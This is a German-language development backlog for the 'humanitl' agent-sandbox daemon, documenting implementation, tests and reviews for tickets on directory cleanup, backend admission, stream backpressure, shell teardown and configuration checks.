<https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/APFS_Guide/FAQ/FAQ.html>);
die Apple File System Reference (2020-06-22,
<https://developer.apple.com/support/downloads/Apple-File-System-Reference.pdf>)
nennt für den Hash eines Eintrags (`j_drec_hashed_key_t`) NFD und die
Merkmale `APFS_INCOMPAT_CASE_INSENSITIVE` und
`APFS_INCOMPAT_NORMALIZATION_INSENSITIVE`, aber keine Tabelle der Faltung. Eine
eigene Tabelle wäre geraten. Der Klon liegt auf dem Volume des Projekts
(`clonefile` kreuzt keine Volumes), also fragt `scan_clone` das Volume selbst:
In jedem Verzeichnis auf dem Weg zu einer Maske schlägt es den Namen der Maske
ohne Symlink nach (`statat` mit `AT_SYMLINK_NOFOLLOW`) und vergleicht Gerät
und Inode des Gefundenen mit jedem Eintrag. Wer dort liegt, ist die Maske (auf
ihr abgelehnt) oder auf dem Weg zu ihr (als Nicht-Verzeichnis abgelehnt, als
Verzeichnis geht der Weg darunter weiter), wie immer er geschrieben ist. Ein
Nachschlagen, das scheitert (außer `ENOENT`), passt auf jeden Eintrag und macht
die Liste unvollständig. Der Vergleich in ASCII bleibt daneben stehen. Für das
Projekt dasselbe beim Löschen: Hat der Mensch eine Maske anders geschrieben,
entfernt `strip_masks` sie gefaltet aus dem Klon, und ihr Fehlen dort ist keine
Löschung (`ProjectMasks`, nach Gerät und Inode im Projekt; scheitert dieses
Nachschlagen, ob vorab für die Masken oder für einen einzelnen Eintrag, wird
keine Löschung gelistet und die Liste ist unvollständig; Review: ein Fehler
beim einzelnen Eintrag galt zuerst als „keine Maske"). Neuer Code in
`daemon/crates/sandbox/src/disposable/spelling.rs`, verdrahtet in `scan.rs`.
Kein neuer Diagnose-Code. Grenze: Ein anderes Volume, das im Projekt
eingehängt ist und anders faltet, sieht der Klon nicht; für eine dort
vorhandene Maske greift der Vergleich in ASCII, für eine fehlende nicht.

**Tests.** `spelling::tests` (rein, drei Tests), in `clone_tests.rs` drei
Tests auf jedem Dateisystem, bei denen ein harter Verweis das Falten nachspielt
(Eintrag gleich Maske, gleich Weg zur Maske, Maske im Projekt anders
geschrieben), `casefold_tests::a_clone_on_a_folding_volume_keeps_its_masks`
auf einem tmpfs mit `casefold` im Nutzer-Namensraum (Kelvin-Zeichen, langes s,
`cafe\u{301}` gegen `caf\u{e9}`; überspringt, wo das nicht geht), und unter
macOS `real_clone::apfs_folding_never_bypasses_a_mask` auf einem echten Klon
(überspringt auf einem Volume mit Unterschied der Schreibweise).
`a_failed_lookup_in_the_project_lists_no_removal` gibt ein scheiterndes
Nachschlagen im Projekt vor (`scan_clone_probed`).
Mutationsbeweise: `standing.on_mask` weg, `toward` weg, die Schritte nicht
weitergereicht, `holds` weg, ein Fehler von `holds` als „keine Maske"; jede
Mutation färbt mindestens einen Test rot.

---

## HUM-492 · Kernel level: `humanitl-vm-<instance>` stays behind after the daemon

### Kontext
Aus HUM-449: Nach dem Ende eines Daemons bleiben leere Verzeichnisse
`humanitl-vm-<instanz>` unter `$XDG_RUNTIME_DIR`, etwa sieben je Lauf der
Escape-Suite; am 2026-11-15 lagen 117 da, drei davon nicht leer.

### Spezifikation
1. Der Daemon entfernt sein Verzeichnis beim Ende; ein Start räumt verwaiste
   Verzeichnisse beendeter Instanzen auf (wie `SANDBOX_041`).

### Akzeptanzkriterien
1. Nach einem Lauf der Escape-Suite bleibt kein Verzeichnis zurück.

### Stand nach der Umsetzung (2026-11-19)
Neues Modul `daemon/crates/sandbox/src/qemu/instance.rs`. Ein Prozess, der
unter `humanitl-vm-<Instanz>` eine Sitzung anlegt, hält vorher eine geteilte
`flock`-Sperre auf die Datei `lock` darin; mit dem Ende seiner letzten
Sitzung wandelt er sie in eine exklusive und entfernt Sperrdatei und
Verzeichnis, wenn nichts anderes mehr darin liegt. Das Ende des
Sitzungsverzeichnisses meldet `handle.rs` über
`backend::session_dir_removed`; am Ende des Daemons gibt
`humanitl_sandbox::release_runtime_dirs` den Rest frei. Damit verschwindet das
Verzeichnis auch in Prozessen ohne Daemon (Escape-Tests, `escape-launch`).

Der Start eines Daemons räumt verwaiste Instanzen (`LeftSandboxes`): nur
Einträge mit genau `humanitl-vm-` und 16 kleinen Hex-Ziffern, Verzeichnisse
dieses Nutzers, mit Sperrdatei, die sich exklusiv sperren lässt; geöffnet
mit `openat2` (`O_NOFOLLOW | O_DIRECTORY`, `RESOLVE_NO_XDEV`,
`RESOLVE_NO_SYMLINKS`) und dem Vergleich des Geräts, verglichen mit dem
Eintrag unter dem Namen, entfernt mit `unlinkat` relativ zum geprüften
Verzeichnis. Nicht leere verwaiste Instanzen werden ganz entfernt (Units
vorher gestoppt, je Sitzung `SANDBOX_041`), denn ihr Besitzer ist
nachweislich tot und der Inhalt liegt auf tmpfs, womöglich mit dem
Gastplan. Die gestoppte Unit ergibt sich aus dem Namen des
Sitzungsverzeichnisses (`humanitl-vm-<Sitzung>`, 32 Hex-Ziffern), nie aus der
Datei `unit` darin, die sonst jede laufende Unit nennen könnte. Ein
eingehängtes Dateisystem oder ein Bind-Mount in einer Waise wird nie
betreten, eine Instanz, die selbst eingehängt ist, nie als verwaist
genommen; eine Sitzung, die tiefer als 32 Ebenen reicht, bleibt liegen. Beides
meldet `SANDBOX_041` mit einem Befehl (`findmnt -R`, `rm -r
--one-file-system`). Verzeichnisse ohne Sperrdatei, also
die aus der Zeit vor diesem Issue, bleiben liegen: Für sie gibt es keinen
Beweis, dass niemand sie benutzt. Nur die eigene Instanz eines Daemons
bekommt beim Start eine Sperrdatei, weil der Start schon bewiesen hat, dass
kein zweiter Daemon dieser Instanz läuft. Ein Start, der auf eine Instanz
trifft, die ein anderer Daemon gerade räumt, wartet höchstens 30 s, ohne
dabei Starts in anderen Instanzen aufzuhalten. Ein Rest: Endet der Daemon,
während ein Sitzungsverzeichnis wegen offener Shells noch verzögert
entfernt wird (`SESSION_DIR_GRACE`), bleibt die Instanz bis zum nächsten
Start liegen, der sie räumt.

Gemessen am 2026-11-19 mit `HUMANITL_ESCAPE_BACKEND=qemu` und
`escape_worktree` (4 Fälle, grün): vorher kamen 4 leere Verzeichnisse je Lauf
dazu (11 auf 15), nachher keins (11 auf 11, dieselben Namen). Die Reste aus
der Zeit vor diesem Issue entfernt man einmal von Hand:
`rmdir /run/user/$(id -u)/humanitl-vm-*` (nur leere).

---

## HUM-493 · The path for unadmitted levels without a level behind it

### Kontext
Aus dem Review von HUM-449: Seit der Zulassung von `qemu` ist keine Stufe
mehr unzugelassen; `SANDBOX_048`, `Backend::detect_unadmitted`, der
Sonderfall in `given_backend` und das Feature `unadmitted-backends` stehen
ohne Stufe da.

### Spezifikation
1. Entscheiden: behalten als Gerüst für das nächste Backend (mit Test, dass
   es greift) oder entfernen, samt Feature und Prüfung in `check-deps.sh`.

### Akzeptanzkriterien
1. Kein ungetesteter toter Pfad.

### Stand nach der Umsetzung (2026-11-19)

**Entscheidung: behalten.** Die Zulassung ist das Tor, das ADR-0020 und
ADR-0021 für jede neue Stufe festschreiben, und `BACKLOG.md` Abschnitt 9 nennt
die nächsten Backends schon (Docker, microsandbox, Incus). Das nächste fände
sonst kein Tor vor; es wieder aufzubauen hieße, Feature, `escape-launch`,
`tests/escape/run.sh`, ESC-5, die Terminal-Tests und die Prüfung in
`tools/check-deps.sh` noch einmal zu schreiben und zu prüfen. Die Umgehung ist
auch heute kein toter Code: `escape-tests-podman` und `escape-tests-qemu`
starten ihre Stufe über `escape-launch` und damit über
`Backend::detect_unadmitted`, also genau den Weg, den die Suite vor der
nächsten Zulassung braucht. Die CI-Jobs bleiben deshalb beim Feature, auch wenn
beide Stufen inzwischen zugelassen sind. Kein Code, kein Feature und kein
Diagnose-Code fallen weg; `daemon/Cargo.toml`, App, Protokoll und Dokumente
bleiben unberührt.

**Was ungeprüft war und jetzt geprüft ist.** Jede Stelle, die die Zulassung
fragt, hatte seit HUM-449 nur noch ihren Erfolgsfall unter Test. Die
Unit-Tests der Sandbox-Crate nehmen dafür je Faden eine Stufe von der Liste
(`test_support::with_admitted`; `backend::admitted_backends` liest die
eingesetzte Liste nur unter `cfg(test)`, der ausgelieferte Bau prüft
unverändert gegen `ADMITTED_BACKENDS`). Neu in
`daemon/crates/sandbox/src/admission_tests.rs`, für jede Stufe dieses Builds
der Reihe nach, die Stufen aus der Liste selbst und nicht aus Adapternamen im
Test (HUM-145, die Kopplungszahlen bleiben gleich): Wahl, Suche und Rückfall
der Vorschau lehnen die herausgenommene Stufe mit `SANDBOX_048` ab (Stufe im
`why`, Knopf zurück auf `auto`), jede andere Stufe besteht die Wahl weiter;
`detect_unadmitted` kommt an der Zulassung vorbei und scheitert erst an der
Suche, während `detect` mit derselben Liste an ihr scheitert; `SANDBOX_036`
für ein Profil, das eine nicht zugelassene Stufe verlangt, hat keinen Knopf
(mit voller Liste schon); die Liste der Backends nennt `SANDBOX_048`, und für
die Stufe der Container-Engine fragt sie eine Attrappe des Programms, die
jeden Aufruf mitschreibt, gar nicht erst. Im Doctor geht
`before_admission_the_probe_is_refused_and_starts_nothing` jetzt den Weg jeder
Gruppe (mit Suche) statt `unadmitted_lines` direkt zu rufen, und
`a_pending_search_still_names_the_admission` prüft die Zeile `admitted`, wenn
die Suche bei Ablauf der Frist noch läuft. Der Sonderfall in `given_backend`
(IPC) ist als `given_against_choice` abgetrennt, damit ein Test die Ablehnung
`SANDBOX_048` einsetzen kann: Sie gilt als erfüllt nur, wenn die Konfiguration
genau das gesetzte Backend nennt.

**Mutationsbeweise.** `admitted` liefert immer `Ok(())`: alle vier Tests in
`admission_tests.rs` und beide Doctor-Tests rot. Die Umgehung fragt
doch die Zulassung: `the_bypass_of_the_escape_suite_skips_admission_and_nothing_else`
rot. `search` im Doctor ohne Zweig der Zulassung: der Doctor-Test vor der
Zulassung rot. `pending_lines` immer mit `Ok(())`:
`a_pending_search_still_names_the_admission` rot. Knopf in `SANDBOX_036`
immer: `a_profile_requiring_an_unadmitted_backend_offers_no_button_to_it` rot.
Die Liste sucht die Engine trotz Ablehnung:
`the_list_names_an_unadmitted_stage_and_does_not_search_its_engine` rot. In
`given_against_choice` ohne den Zweig für `SANDBOX_048` oder ohne den Vergleich
mit dem Namen aus der Konfiguration:
`an_unadmitted_given_backend_starts_only_when_the_configuration_names_it` rot.

---

## HUM-494 · App: the settings row of the backends is too narrow with four levels

### Kontext
Aus HUM-447: Mit vier Segmenten bleibt der linken Spalte etwa 250 px; der
Grund einer fehlenden Voraussetzung läuft über rund 13 Zeilen, der
kopierbare Befehl neben dem Knopf schrumpft auf einen Streifen.

### Spezifikation
1. Die Zeile so umbauen, dass Grund und Befehl lesbar bleiben (etwa die Wahl
   über der Erklärung statt daneben); Screenshot vor und nach dem Umbau.

### Akzeptanzkriterien
1. Grund und Befehl einer fehlenden Voraussetzung in voller Breite lesbar.

---

## HUM-495 · doctor: `virtio_fs` unmeasured when the kernel image is missing

### Kontext
Aus dem Review von HUM-488: Fehlt das Kernel-Abbild, wiederholt die Zeile
`virtio_fs` dessen Befund, obwohl virtiofs gar nicht prüfbar war.

### Spezifikation
1. Die Zeile heißt dann „nicht gemessen", mit Verweis auf die Zeile
   `kernel`.

### Akzeptanzkriterien
1. Keine Zeile meldet einen Fehler, den sie nicht geprüft hat.

### Stand nach der Umsetzung
Die Adapter melden eine Voraussetzung ohne Start jetzt als `StaticLine`
(`daemon/crates/sandbox/src/doctor/backends.rs`): geprüft mit Beleg oder
Befund, oder `Unchecked { after, needs }`, wenn die Prüfung eine andere,
gescheiterte Voraussetzung braucht. Der Doctor macht daraus eine Zeile ohne
Messung (`warn`, `DOCTOR_012`, Beleg `not measured: it needs the kernel image,
and the line kernel reports it missing; fix the line kernel first, ...`). Der
Vorschlag bleibt `humanitl doctor`, wie bei jeder Zeile ohne Messung der
Befehl, der sie misst; einen Verweis auf eine andere Zeile kennt `FixAction`
nicht. Die Kernel-Stufe meldet `virtio_fs` so, wenn das Kernel-Abbild fehlt;
nur `kernel` trägt dann `SANDBOX_045`. Die übrigen Zeilen der Kernel-Stufe
(`kvm`, die vier Programme, `modules`) und die drei der Container-Engine
prüfen je für sich und erben keinen Befund; `modules` sucht sein Verzeichnis
selbst und hängt nicht am Abbild. Kein neuer Code, kein neuer Zustand im
Protokoll: Der Zustand „nicht gemessen" war schon da, die App zeigt ihn ohne
Änderung. `docs/cli.md` und die deutsche Übersetzung nennen den Fall.

---

## HUM-496 · CLI: a disposable session in one command, like an agent started natively, with a boot animation

### Kontext
Vision des Owners vom 2026-11-15: Ein Befehl startet eine Wegwerf-Sitzung
(etwa in der Micro-VM), und man landet im Terminal des Agenten, als hätte man
`claude` oder `pi` nativ gestartet. Während die VM startet, dreht sich als
3D-ASCII die Faust des Logos in Gelb, mindestens eine Sekunde, auch wenn der
Start schneller ist. Vorbild des Owners: github.com/heiervang-technologies/a3d.rs.
Heute geht der Start schon mit `humanitl run --disposable --backend qemu`.

### Spezifikation
1. Ein kurzer Einstieg (Name im Design zu klären), der die Wegwerf-Sitzung mit
   den Vorgaben des Nutzers startet und das Terminal des Agenten direkt
   übergibt; am Ende die Frage, was übernommen wird.
2. Die Ladeanimation ohne neue schwere Abhängigkeit: a3d.rs bringt wgpu mit,
   hat kein Release und keine Nutzer; stattdessen ein kleiner eigener
   CPU-Renderer oder beim Bau eingebettete Bilder, aus der in die Tiefe
   gezogenen Silhouette des Logos.
3. Nur in einem Terminal; nicht bei `--json` oder ohne TTY, ohne Farbe bei
   `NO_COLOR`; eine Einstellung schaltet sie ab.

### Akzeptanzkriterien
1. Ein Befehl bis zum Prompt des Agenten in der Wegwerf-Sitzung.
2. Die Animation läuft mindestens eine Sekunde und hält den Start nicht
   länger auf, als er ohnehin dauert.

### Status
Erledigt. `humanitl go [-- CMD]` ist `humanitl run --disposable` mit
übergebenem Terminal, auch für den Agenten aus der Konfiguration ohne
`-- CMD`; am Ende listet es die wartenden Änderungen und fragt: übernehmen,
verwerfen, Diffs ansehen oder liegen lassen (nur übernehmen und verwerfen
berühren das Projekt, Ctrl+C lässt alles liegen). `--ask terminal` lehnt `go`
vor dem Start mit `CLI_002` ab, weil das Terminal dem Agenten gehört. Die
Ladeanimation ist ein kleiner eigener CPU-Raymarcher (`src/splash/`, ohne
neue Abhängigkeit): die Faust aus `packaging/deb/humanitl.svg`, gerastert von
`tools/splash_fist.py`, in die Tiefe gezogen, gelb in Truecolor mit
Halbblöcken, einfarbig bei `NO_COLOR`, nur auf einem Terminal und nie bei
`--json`, abschaltbar mit `terminal.splash = false`. Sie steht mindestens
eine Sekunde; Start-Ereignisse werden so lange gehalten (`cmd/hold.rs`) und
danach in Reihenfolge gezeigt. Der Zeichen-Thread besitzt den Schreiber und
schreibt das Wiederherstellen selbst; vor der Übergabe ans Terminal des
Agenten wartet `go`, bis es geschrieben ist, Signale und Fehler halten nur
250 ms. Tests: Rahmen, Einfarbigkeit, Mindestdauer, pty-Übergabe nach einer
Sekunde, ein angehaltenes Terminal, Signale an der Schlussfrage, `go` ohne
Terminal byte-gleich zu `run --disposable`; Mutationen rot.

Review: Codex Runde 1 zwei blocking (Stopp hinter einem blockierten
Schreiben; `go --ask terminal` gab das Terminal der Moderation) und ein
major (Signale an der Schlussfrage verschluckt), alle behoben; Delta ein
blocking (Wiederherstellen nach Zeitablauf über dem Bild des Agenten) und
ein minor (Signale während des Abholens der Änderungen), beide behoben.
Sonnet als Ersatz für Antigravity kein blocking oder major, Minors
übernommen (`print_diffs`, das Halten der Ereignisse aus `drive` gelöst).
Offen: `run.rs` hat weiter rund 1740 Zeilen; die Animation will der Owner
später noch schöner machen.

---

## HUM-497 · Stromkanal: Eingabe an ein Terminal bekommt Gegendruck statt still zu verfallen

### Kontext
Aus dem Ultra-Review vom 2026-11-15 (PR #1). Im Stromkanal der Kernel-Stufe verwirft der Shim `D`-Bytes, sobald die Warteschlange eines Terminals `IN_HIGH` (64 KiB) erreicht (`daemon/bin/humanitl-shim/src/stream.rs`), während `SandboxHandle::write_input` und `Shell::write_input` Erfolg melden. Die IPC-Schicht verlässt sich darauf, dass das Schreiben blockiert, wenn der Agent nicht liest (`ipc/src/terminal.rs`). Ein Einfügen von mehr als rund 80 KiB verliert so Bytes aus der Mitte, und der Agent bekommt eine Anweisung mit Lücke.

### Spezifikation
1. Der Stromkanal hält den Vertrag des Schreibens: Gegendruck je Kanal (Kredit- oder Quittungsrahmen, `send_data` wartet auf Platz) oder ein Ablehnungsrahmen, den `write_input` als `TERM_002` meldet; nie stilles Verwerfen bei gemeldetem Erfolg.

### Tests
- Integration im Stream-Modus: 300 KiB Eingabe an ein Terminal, dessen Leser langsam liest, kommen vollständig an oder enden mit einem Fehler beim Client. Mutationsbeweis: das alte Verwerfen färbt den Test rot.

### Akzeptanzkriterien
1. Keine Eingabe geht verloren, während der Client Erfolg sieht.

### Stand nach der Umsetzung (2026-11-15)
Guthaben je Kanal: neuer Rahmen `G` (Shim an Daemon, `u32` 1 bis 64 KiB,
`frame::WINDOW`); der Daemon schickt je Terminal höchstens das Guthaben
(`Window { left, unacked }`, ein `G` gibt höchstens die gesendeten,
unbestätigten Bytes zurück) und wartet sonst bis zu `STREAM_SEND_WAIT` (10 s)
je Stück, danach `TERM_002`, der Strom bleibt offen; Ende des Kanals oder
des Stroms weckt den Wartenden sofort, und ein Schreiben, über das ein `E`
lief, scheitert mit `NotConnected`. Der Shim zählt geschriebene Bytes und gibt
Guthaben nur, solange sein Ausgang unter `OUT_HIGH` liegt, auch gleich nach
dem Leeren. Tests: 300 KiB an einen langsamen Leser kommen ganz an (Shim,
ipc unter bwrap in beiden Modi, KVM), Mutationen rot (altes Verwerfen,
Guthaben ignoriert, kein Grant, Grant über das Gesendete, Prüfung auf `E`).
Grenze, dokumentiert: Das Guthaben schützt vor einem Agenten, der nicht
liest, nicht vor einem feindlichen Gast, der sein Terminal besitzt; endet
der Prozess eines Terminals genau zwischen einem Stück und der Meldung seines
Endes, geht dieses Stück verloren wie beim Schreiben auf ein sterbendes pty.
Kandidat: eine Gesamtfrist je Schreiben statt je Stück (ein Gast, der
tröpfelnd Guthaben gibt, hält einen Faden dieses Terminals).


---

## HUM-498 · Stromkanal: eine Shell, deren Öffnen scheiterte, wird im Gast geschlossen

### Kontext
Aus dem Ultra-Review. Scheitert `ask_stream` nach dem `O`-Rahmen (keine Antwort in `ANSWER_WAIT`, `daemon/crates/sandbox/src/shell.rs`), sendet der Daemon kein `C`; eine Shell, die der Shim danach doch startet, läuft bis zum Ende der Sitzung, belegt einen der `MAX_SHELLS` Plätze, und ein spätes `R` lässt den Platz im Daemon `Orphaned`.

### Spezifikation
1. Nach jedem Fehler nach dem `O`-Rahmen geht `Kind::Close` für diese Kennung an den Shim (der Shim ignoriert `C` für unbekannte Kanäle).

### Tests
- Unit mit einem Shim, der nach der Frist antwortet: die Shell wird geschlossen, der Platz ist frei; Mutationsbeweis.

### Akzeptanzkriterien
1. Keine Shell überlebt ihr gescheitertes Öffnen.

### Stand nach der Umsetzung (2026-11-15)
`ShellDoor::ask_stream` schickt nach jedem Fehler hinter dem `O` (keine
Antwort in der Frist, Fehler beim Senden) ein `C` für dieselbe Kennung. Der
Strom hält die Reihenfolge und der Shim arbeitet seine Rahmen der Reihe nach
ab: Startet er die Shell für das `O` doch noch, legt das `C` sie gleich auf,
ihr `E` folgt; hat er das `O` nie gestartet oder verworfen, ignoriert er das
`C`. Das `C` geht vom Faden des Aufrufers hinaus, nicht vom Leser des Stroms
als Antwort auf ein spätes `R`, denn der Leser darf nie auf Platz im Strom
warten. Der Platz im Daemon: Steht die Kennung beim Aufgeben noch auf
`Asked`, wird sie ausgetragen, ein spätes `R` findet sie nicht mehr und
ändert nichts; kam das `R` knapp vor dem Aufgeben, wird sie `Orphaned`, und
das `E` nach dem `C` gibt sie frei. Die Socket-Tür ohne Strom brauchte
nichts: Dort fällt beim Scheitern die Herrscherseite des Terminals, und die
spät gestartete Shell sieht das Auflegen. Die Frist der Antwort ist intern
ein Parameter (`open_within`), damit der Test nicht fünf Sekunden wartet.
Test: ein Shim, der erst nach der Frist mit `R` antwortet; das `C` für die
Kennung kommt, kein Platz bleibt belegt, die nächste Shell öffnet.
Mutationsbeweis: ohne das `C` rot. Kein eigener KVM-Test: ein echter Shim
lässt sich nicht ehrlich verspäten; die KVM-Tests des Stroms bleiben grün.
Review: Das `C` allein legte nur das Terminal auf, eine Shell, die `SIGHUP`
überhört (`trap '' HUP`), lief weiter und hielt ihren Platz im Shim und,
nach dem knappen `R`, den im Daemon. Seither merkt sich der Shim beim `C`
einer weiteren Shell eine Frist (`HANGUP_GRACE`, 1 s: genug, damit eine
Shell auf `SIGHUP` ihre Historie schreibt, kurz genug für den Platz) und
schickt danach ihrer Prozessgruppe `SIGKILL` (die Shell ist nach `setsid`
Führerin ihrer Gruppe); ihr Reap meldet das `E`. Die Frist läuft über die
Zeitgrenze von `poll` in der Schleife von PID 1, nie über ein Warten; `kill`
erlaubt der Filter von PID 1. Das gilt ebenso für das `C` aus
`Shell::drop`, nie für den Kanal des Agenten. Der Fehlerpfad von `open`
nutzt jetzt `release`, derselbe Übergang wie beim Fallen einer Shell. Tests
dazu: im Shim eine echte Shell, die `SIGHUP` überhört; sie überlebt das
Auflegen, ist nach der Frist mit `SIGKILL` beendet, ihr `E` geht hinaus, und
danach öffnen wieder `MAX_SHELLS` Shells (Mutationsbeweis: ohne die
Eskalation rot). Im Daemon der Übergang `Started`, `Orphaned`, `E` ohne
Platz. Zweite Runde: Endet die Shell auf das Auflegen vor der Frist, nimmt
ihr Reap die Prozessgruppe mit (`kill(-pid, SIGKILL)`), sonst lebte ein Kind
ihrer Gruppe, das `SIGHUP` überhört, als Waise weiter. Sicher auch nach dem
Reap: Linux gibt eine Prozessnummer erst frei, wenn kein Prozess sie mehr als
Kennung, Gruppe oder Sitzung trägt (`__change_pid`); ohne Mitglied endet der
Aufruf mit `ESRCH`. Der Test der Eskalation pollt jetzt mit
`Session::timeout_ms` wie PID 1 und belegt so, dass die Frist die Schleife
weckt (ohne die Frist in `timeout_ms` kommt das `SIGKILL` erst mit dem
Lebenszeichen nach 5 s: rot); ein zweiter Test startet ein Kind in der
Gruppe der Shell, das `SIGHUP` überhört, und prüft, dass es mit dem Reap der
Shell verschwindet (ohne das Töten beim Reap: rot). Was eine Shell in eine
eigene Prozessgruppe oder Sitzung schiebt, erreicht das `SIGKILL` nicht; es
zählt aber nicht gegen `MAX_SHELLS` und endet mit der Sandbox.


---

## HUM-499 · Stromkanal: Größenänderung und Schließen blockieren keinen Worker des Daemons

### Kontext
Aus dem Ultra-Review. Im Stream-Modus ruft `TerminalHub::resize` aus asynchronem Code (`ipc/src/terminal.rs`, `session()` und `resize_pump`) `StreamDoor::send` auf, das bis zu `STREAM_SEND_WAIT` (10 s) auf den Schreibzug und Platz im Socket wartet; ebenso das `C` in `Shell::drop`. Mehrere solcher Wartezeiten legen die Worker der gRPC-Laufzeit lahm.

### Spezifikation
1. Jedes Senden auf dem Strom aus asynchronem Code läuft über `spawn_blocking` oder einen Pfad ohne Warten.

### Tests
- Test: ein blockierter Strom und eine Größenänderung halten andere RPCs nicht auf; Mutationsbeweis.

### Akzeptanzkriterien
1. Kein Warten auf den Strom auf einem Worker der Laufzeit.

### Stand nach der Umsetzung (2026-11-15)
Aufrufstellen aus asynchronem Code, die den Strom erreichen: die Größe
(`TerminalHub::resize` aus `session()` und `resize_pump`, darunter
`SandboxHandle::resize` und `Shell::resize`) und das Fallen einer Shell
(`Shell::drop`, das `C`; der letzte `Arc<Shell>` fällt mit dem Terminal in
Tasks der Laufzeit). Schreiben (`write_input`) und Öffnen (`exec`) liefen
schon über `spawn_blocking`, `interrupt` ruft nur die CLI aus
`spawn_blocking`, das `C` im Fehlerpfad von `ask_stream` geht vom Faden des
Öffnens. Größe und `C` legt der Daemon jetzt nur ab (`Posted` in
`StreamDoor`: je Kanal die letzte Größe, dazu die Kennungen gefallener
Shells, begrenzt durch die Zahl der Kanäle) und kehrt sofort zurück; ein
eigener Faden je Strom (`sandbox-stream-out`) schickt das Abgelegte und
endet mit dem Strom. Jedes andere Senden schickt das Abgelegte vor seinen
Rahmen, damit eine Größe nie hinter eine spätere Eingabe fällt (der
KVM-Test „GOT hello SIZE 30 100" hängt daran). Ein `C` verwirft eine
abgelegte Größe derselben Shell. Nach dem Ende des Stroms meldet die Größe
`BrokenPipe` wie bisher einen Fehler. Kein Warteschlangenwachstum, kein
`spawn_blocking` im ipc: `TerminalHub::resize` blockiert nicht mehr. Der
Deskriptor-Modus bleibt unverändert (`tcsetwinsize`). `Door::Stream` trägt
die Strom-Tür jetzt in einer `Box`: Mit den zusätzlichen Sperren war die
Variante unter macOS zu groß (`clippy::large_enum_variant`). Tests: Während ein
anderer Schreiber den Strom hält, kehren zwei Größen des Agenten, die
Größe einer Shell und ihr Fallen in unter 500 ms zurück, danach gehen nur
die letzte Größe des Agenten und das `C` der Shell hinaus; eine abgelegte
Größe geht vor der Eingabe danach hinaus, auch ohne den Faden; nach dem
Ende des Stroms scheitert die Größe. Mutationsbeweise: Größe direkt
gesendet (rot nach 10 s), `C` im `drop` direkt gesendet (rot), kein
Mitnehmen des Abgelegten beim Senden (rot). Review: Das Ende des Lesers
läuft in einem Drop-Wächter (`ReaderEnd`), also auch, wenn der Leser
abbricht (etwa eine Panik in der Ausgabe des Agenten); dann geht der Strom
zusätzlich ganz zu, damit der Shim das Ende sieht, und der Faden des
Abgelegten schläft nicht für immer. Der Faden sendet nur, was er selbst
nimmt: Hat ein anderes Senden das Abgelegte schon mitgenommen, schreibt er
nichts, und läuft seine Frist auf den Turn ab, während nichts mehr liegt,
schließt er den Strom nicht. Tests dazu: Der Faden endet mit dem Strom und
lässt die Tür los (ohne das Ende in seiner Warteschleife rot); ein Leser,
dessen Ausgabe in Panik gerät, beendet den Strom trotzdem, die Größe meldet
`BrokenPipe`, der Shim liest das Ende (ohne das Ende beim Abbruch rot).
Offen: ein Test über die
Laufzeit selbst (tokio, Zeitgeber) bräuchte eine Sandbox mit angehaltenem
Shim; die Zeitschranke im Unit-Test belegt dieselbe Eigenschaft für jeden
Aufrufer.


---

## HUM-500 · Image-Pull nimmt das Backend der Sitzung

### Kontext
Aus dem Ultra-Review. `Sandbox(ImagePull)` löst das Backend immer aus dem gespeicherten `sandbox.backend` auf (`ipc/src/sandbox.rs`, `image_pull` mit `Plan::default()`); wer Podman nur für eine Sitzung wählt (`Plan.backend`, `cli_overrides`, `--backend podman`), zieht bei `auto` über bwrap, und der Pull scheitert; der Start bleibt bei `SANDBOX_043`.

### Spezifikation
1. `ImagePull` trägt das Backend der Sitzung (wie `Plan.backend`) und löst es wie ein Start auf; App und CLI schicken es mit.

### Tests
- ipc: Konfiguration `auto`, Wahl `podman` für die Sitzung, Pull geht an Podman; Mutationsbeweis.

### Akzeptanzkriterien
1. Der Knopf „Pull" und `humanitl sandbox image pull` treffen das Backend, das der Start verlangt.

### Stand nach der Umsetzung (2026-11-15)
`SandboxRequest.ImagePull` trägt ein neues Feld `Plan plan = 3`, wie
`SandboxBackendsRequest.plan`; Vertrag 1.40. Mit Plan löst der Daemon das
Backend des Ziehens über denselben Weg wie die Backend-Liste und den
Schnappschuss auf (`Inner::plan_sandbox`: `Plan.backend`, Projekt-Profil,
Untergrenze, Zulassung, Anforderung des Sandbox-Profils) und sucht es mit
`Backend::detect`; ohne Plan bleibt es bei der gespeicherten Einstellung.
Anders als die Liste ist das Ziehen streng mit dem Sandbox-Profil
(`ProfileRead::Strict`): Ein Profil, das sich nicht lesen lässt, hält es mit
seinem Befund auf (`CONFIG_001`) wie den Start, und ein Profil, das ein
anderes Backend verlangt, lehnt es mit `SANDBOX_036` ab.
Die App schickt den Plan ihrer Schnappschüsse mit
`sessionSandboxBackendProvider`, die CLI das Backend, das `humanitl run` in
`cli_overrides` schickte (`--backend` vor `HUMANITL_SANDBOX__BACKEND`), und
lehnt einen Daemon vor 1.40 mit `CLI_004` ab, wenn ein Backend gewählt ist.
Die CLI schickt keinen Projektordner mit; die Untergrenze eines Projekts gilt
deshalb für den gespeicherten Ordner, nicht für das aktuelle Verzeichnis.


---

## HUM-501 · Konfiguration: Obergrenzen aus der Hardware nur für das gewählte Backend

### Kontext
Aus dem Ultra-Review. `Config::validate` prüft `sandbox.podman.{memory_mib,cpus}` und `sandbox.qemu.{memory_mib,cpus}` bei jedem Laden gegen `MemTotal` und `available_parallelism` dieses Rechners, gleich welches Backend gewählt ist. Eine Konfiguration von einem größeren Rechner oder ein Prozess unter `taskset` macht so jeden Befehl unbenutzbar, auch bwrap; Daemon und CLI können je nach CPU-Affinität verschieden urteilen.

### Spezifikation
1. Beim Laden nur die festen Untergrenzen; die Obergrenzen aus der Hardware prüft der Start des Backends, das die Gruppe nutzt.

### Tests
- config: ein Wert über der Hardware lädt; ein Start mit genau diesem Backend lehnt ihn mit Grund ab.

### Akzeptanzkriterien
1. Kein Wert eines nicht gewählten Backends macht die Konfiguration unladbar.

### Stand nach der Umsetzung (2026-11-15)

**Laden.** `Config::validate` prüft für `sandbox.podman` und die Gruppe der Kernel-Stufe nur noch die festen Untergrenzen (256 MiB, 1 CPU); `validate_on` und der Blick auf den Host beim Laden sind weg. Damit urteilen Daemon und CLI gleich, unabhängig von der CPU-Affinität des Prozesses.

